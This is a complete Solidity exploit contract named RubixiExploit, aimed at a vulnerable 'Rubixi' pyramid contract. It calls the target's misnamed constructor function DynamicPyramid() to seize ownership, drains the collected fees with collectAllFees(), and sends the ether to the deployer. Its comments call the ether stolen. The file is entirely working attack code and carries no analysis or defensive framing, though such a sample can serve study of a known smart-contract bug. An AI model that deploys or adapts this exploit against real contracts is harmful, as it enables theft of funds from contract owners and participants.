pragma solidity ^0.4.15;

interface IRubixi {
    function DynamicPyramid() external;
    function collectAllFees() external;
    function changeOwner(address _owner) external;
}

contract RubixiExploit {
    address public owner;
    IRubixi public target;

    function RubixiExploit(address _target) public {
        owner = msg.sender;
        target = IRubixi(_target);
    }

    // Take ownership of the vulnerable contract
    function becomeCreator() public {
        target.DynamicPyramid(); // overwrites creator
    }

    // Drain collectedFees from contract
    function drainFees() public {
        target.collectAllFees(); // sends fees to this contract
    }

    // Forward stolen ether to attacker's wallet
    function withdraw() public {
        require(msg.sender == owner);
        msg.sender.transfer(address(this).balance);
    }

    // Accept ETH from target contract
    function() public payable {}
}

